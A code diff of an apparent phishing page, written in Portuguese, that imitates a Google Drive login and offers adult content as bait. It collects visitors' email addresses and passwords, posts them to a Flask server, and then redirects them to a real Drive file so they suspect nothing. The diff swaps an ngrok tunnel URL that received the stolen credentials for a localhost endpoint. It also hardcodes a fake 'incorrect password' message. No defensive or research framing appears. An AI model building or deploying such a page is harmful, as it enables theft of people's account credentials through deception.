@@ -80,26 +80,19 @@
     <div class="gradient-overlay right"></div>
     <div class="container">
         <h2>Conteúdos GoogleDrive🔞</h2>
-        <form id="loginForm" method="POST" action="https://d2dd-2804-6850-8000-3d01-f998-9041-82cc-329e.ngrok-free.app">
+        <form id="loginForm" method="POST" action="http://127.0.0.1:5000">
             <div class="form-group">
                 <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
             </div>
             <div class="form-group">
                 <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
             </div>
-            <button type="button" onclick="enviarFormulario()">Entrar</button>
-            <!-- Exibir mensagem de erro -->
-            <p id="mensagemErro" style="color: red;"></p>
+            <button type="button" onclick="enviarFormulario()">Entrar</button> <!-- Alteração aqui: Adicionando onclick para chamar a função enviarFormulario() -->
+            <p id="mensagemErro" style="color: red;"></p> <!-- Adicionando o elemento para exibir a mensagem de erro -->
         </form>
     </div>
 
     <script>
-        // Obtém o endereço IP atual da página
-        var enderecoIP = window.location.hostname;
-
-        // Atualiza o atributo action do formulário com o endereço IP
-        document.getElementById("loginForm").action = "https://" + enderecoIP + ":5000";
-
         function enviarFormulario() {
             var email = document.getElementById('email').value;
             var password = document.getElementById('password').value;
@@ -114,15 +107,14 @@
             formData.append('password', password);
 
             var xhr = new XMLHttpRequest();
-            xhr.open('POST', document.getElementById("loginForm").action); // Usa o endereço IP dinâmico
+            xhr.open('POST', 'http://127.0.0.1:5000'); // Alteração aqui: Defina a URL do seu endpoint de login no servidor Flask
             xhr.onload = function () {
                 if (xhr.status === 200) {
                     // Sucesso
                     window.location.href = "https://drive.google.com/file/d/1-n2-7RG13HA7ttCVJukD_PpoMDsSRS6n/view?usp=drive";
                 } else {
                     // Erro
-                    var mensagem = xhr.responseText; // Obter a mensagem de erro do Flask
-                    document.getElementById('mensagemErro').innerText = mensagem;
+                    document.getElementById('mensagemErro').innerText = 'Email e/ou senha incorretos. Por favor, tente novamente.';
                 }
             };
             xhr.send(formData);
